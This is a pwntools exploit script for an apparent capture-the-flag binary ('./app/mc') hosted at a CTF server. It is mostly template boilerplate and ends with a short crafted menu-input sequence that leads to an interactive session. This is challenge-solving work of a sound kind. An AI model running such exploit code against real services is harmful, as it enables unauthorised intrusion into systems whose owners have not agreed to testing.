#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./app/mc --host ctfd.cybpaws.su --port 11778
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './app/mc')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'ctfd.cybpaws.su'
port = int(args.PORT or 11778)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
set resolve-heap-via-heuristic force
set follow-fork-mode parent
b *0x5555555557a4
continue
'''.format(**locals())
context.terminal = ['terminator', '--new-tab', '-e']

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

io = start()

io.recvuntil(b'> ')
io.sendline(b'1')
io.recvuntil(b'> ')
io.sendline(b'w' * 255)

# pause()

io.recvuntil(b'> ')
io.sendline(b'3')
io.recvuntil(b'> ')
io.sendline(b'7')
io.recvuntil(b'> ')
io.send(b'T' + b'A' * 3 + p8(9) + p8(4) + p8(9))

io.recvuntil(b'> ')
io.sendline(b'2')

io.interactive()